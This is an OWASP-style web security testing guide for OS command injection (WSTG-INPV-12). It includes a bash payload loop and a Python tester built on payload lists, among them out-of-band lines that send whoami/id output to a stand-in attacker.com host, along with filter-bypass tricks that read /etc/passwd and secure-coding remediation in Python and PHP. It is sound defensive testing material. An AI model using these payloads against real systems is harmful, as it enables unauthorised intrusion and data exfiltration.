# WSTG-INPV-12: Testing for Command Injection

## Test ID
WSTG-INPV-12

## Test Name
Testing for Command Injection

## High-Level Description

Command Injection (OS Command Injection) occurs when an application passes unsafe user data to a system shell. Attackers can execute arbitrary operating system commands, potentially gaining full control of the server.

---

## What to Check

- [ ] Shell metacharacter injection
- [ ] Command chaining operators
- [ ] Backtick command substitution
- [ ] Blind command injection
- [ ] Out-of-band command injection

---

## How to Test

### Step 1: Identify Command Injection Points

```bash
#!/bin/bash
TARGET="https://target.com/api/ping"

echo "[*] Testing for Command Injection..."

# Command injection payloads
PAYLOADS=(
    "; id"
    "| id"
    "|| id"
    "& id"
    "&& id"
    "\`id\`"
    "\$(id)"
    "; id #"
    "| id #"
    "%0Aid"
    "127.0.0.1; id"
    "127.0.0.1 | id"
    "127.0.0.1 && id"
)

for payload in "${PAYLOADS[@]}"; do
    encoded=$(echo -n "$payload" | jq -sRr @uri)
    response=$(curl -s "$TARGET?host=$encoded")
    if echo "$response" | grep -q "uid="; then
        echo "[VULN] Command Injection: $payload"
    fi
done
```

### Step 2: Command Injection Tester

```python
#!/usr/bin/env python3
"""
Command Injection Vulnerability Tester
"""

import requests
import time
import socket

class CommandInjectionTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Command injection payloads
    PAYLOADS = {
        'basic': [
            # Semicolon
            "; id",
            ";id",
            "; id;",

            # Pipe
            "| id",
            "|id",

            # AND/OR
            "&& id",
            "|| id",
            "& id",

            # Backticks
            "`id`",

            # Command substitution
            "$(id)",

            # Newline
            "%0aid",
            "\nid",
            "\r\nid",
        ],
        'with_prefix': [
            # Common input with injection
            "127.0.0.1; id",
            "127.0.0.1 | id",
            "127.0.0.1 && id",
            "127.0.0.1 || id",
            "test.txt; id",
            "test; id",
        ],
        'blind_time': [
            # Time-based payloads
            "; sleep 5",
            "| sleep 5",
            "&& sleep 5",
            "|| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",

            # Windows
            "& ping -n 5 127.0.0.1",
            "| ping -n 5 127.0.0.1",
        ],
        'oob': [
            # DNS exfiltration
            "; nslookup attacker.com",
            "| nslookup attacker.com",
            "; curl http://attacker.com/$(whoami)",
            "| wget http://attacker.com/$(id)",
        ],
        'bypass': [
            # Space bypass
            ";{id}",
            ";$IFS$9id",
            ";${IFS}id",
            ";\tid",

            # Quotes bypass
            "';id;'",
            '";id;"',

            # Encoded
            "%3Bid",  # ;id
            "%7Cid",  # |id
        ],
    }

    def test_basic_injection(self, param='host'):
        """Test basic command injection"""
        print("\n[*] Testing basic command injection...")

        for payload in self.PAYLOADS['basic'] + self.PAYLOADS['with_prefix']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                # Check for command output
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"[VULN] Command Injection!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'Command Injection',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

                # Check for whoami output
                if 'www-data' in response.text or 'root' in response.text or \
                   'apache' in response.text or 'nginx' in response.text:
                    print(f"[VULN] Possible command injection!")
                    print(f"  Payload: {payload}")

            except Exception as e:
                pass

        return False

    def test_blind_injection(self, param='host'):
        """Test blind/time-based command injection"""
        print("\n[*] Testing blind command injection (time-based)...")

        # Get baseline response time
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.PAYLOADS['blind_time']:
            try:
                start = time.time()
                self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=30
                )
                elapsed = time.time() - start

                # Check if response was delayed
                if elapsed > baseline + 4:
                    print(f"[VULN] Blind Command Injection!")
                    print(f"  Payload: {payload}")
                    print(f"  Response time: {elapsed:.2f}s (baseline: {baseline:.2f}s)")
                    self.findings.append({
                        'type': 'Blind Command Injection (Time-based)',
                        'payload': payload,
                        'response_time': elapsed,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Blind Command Injection (timeout)!")
                print(f"  Payload: {payload}")
                self.findings.append({
                    'type': 'Blind Command Injection',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def test_oob_injection(self, param='host', callback_server='YOUR-COLLABORATOR'):
        """Test out-of-band command injection"""
        print("\n[*] Testing OOB command injection...")

        oob_payloads = [
            f"; nslookup {callback_server}",
            f"| nslookup {callback_server}",
            f"; curl http://{callback_server}/$(whoami)",
            f"| wget http://{callback_server}",
            f"`nslookup {callback_server}`",
        ]

        for payload in oob_payloads:
            try:
                self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )
                print(f"  Sent OOB payload: {payload[:40]}")
            except Exception as e:
                pass

        print(f"  [INFO] Check {callback_server} for callbacks")

    def test_bypass_techniques(self, param='host'):
        """Test filter bypass techniques"""
        print("\n[*] Testing bypass techniques...")

        for payload in self.PAYLOADS['bypass']:
            try:
                response = self.session.get(
                    self.url,
                    params={param: payload},
                    timeout=10
                )

                if 'uid=' in response.text:
                    print(f"[VULN] Bypass successful!")
                    print(f"  Payload: {payload}")
                    self.findings.append({
                        'type': 'Command Injection (Bypass)',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("COMMAND INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo command injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                print(f"  Payload: {f['payload']}")

    def run_tests(self, param='host'):
        """Run all command injection tests"""
        self.test_basic_injection(param)
        self.test_blind_injection(param)
        self.test_bypass_techniques(param)
        # self.test_oob_injection(param)  # Uncomment with valid callback
        self.generate_report()

# Usage
tester = CommandInjectionTester("https://target.com/api/ping")
tester.run_tests()
```

### Step 3: Payload Reference

```bash
# Command Chaining Operators
; cmd    # Sequential execution
| cmd    # Pipe output
|| cmd   # Execute if previous fails
& cmd    # Background execution
&& cmd   # Execute if previous succeeds
\n cmd   # Newline

# Command Substitution
`cmd`
$(cmd)

# Bypass Techniques (spaces)
{cmd,arg}
cmd$IFS$9arg
cmd${IFS}arg
cmd%09arg    # Tab
cmd<arg      # Redirect

# Bypass Techniques (filters)
c\at /etc/passwd
ca$()t /etc/passwd
ca$@t /etc/passwd
w'h'o'am'i
w"h"o"am"i

# Windows Payloads
& whoami
| whoami
&& whoami
|| whoami
%0Awhoami
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Commix | Automated command injection |
| Burp Collaborator | OOB detection |
| Custom scripts | Targeted testing |

---

## Remediation

```python
# Python - Use subprocess with list arguments
import subprocess

# VULNERABLE
os.system("ping " + user_input)

# SECURE - Use list to avoid shell interpretation
subprocess.run(["ping", "-c", "4", user_input],
               shell=False,
               capture_output=True)

# With input validation
import re
def safe_ping(host):
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        raise ValueError("Invalid hostname")
    subprocess.run(["ping", "-c", "4", host], shell=False)
```

```php
<?php
// PHP - Use escapeshellarg/escapeshellcmd
// VULNERABLE
system("ping " . $_GET['host']);

// SECURE
$host = escapeshellarg($_GET['host']);
system("ping -c 4 " . $host);

// Better - Validate input
if (preg_match('/^[a-zA-Z0-9.-]+$/', $_GET['host'])) {
    $host = escapeshellarg($_GET['host']);
    system("ping -c 4 " . $host);
}
?>
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Direct command execution | 9.8 | Critical |
| Blind command injection | 9.8 | Critical |
| OOB command injection | 9.8 | Critical |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-78** | Improper Neutralization of Special Elements used in an OS Command |

---

## Checklist

```
[ ] Shell operators tested
[ ] Time-based blind tested
[ ] OOB tested
[ ] Bypass techniques tested
[ ] Windows/Linux variants tested
[ ] Findings documented
```
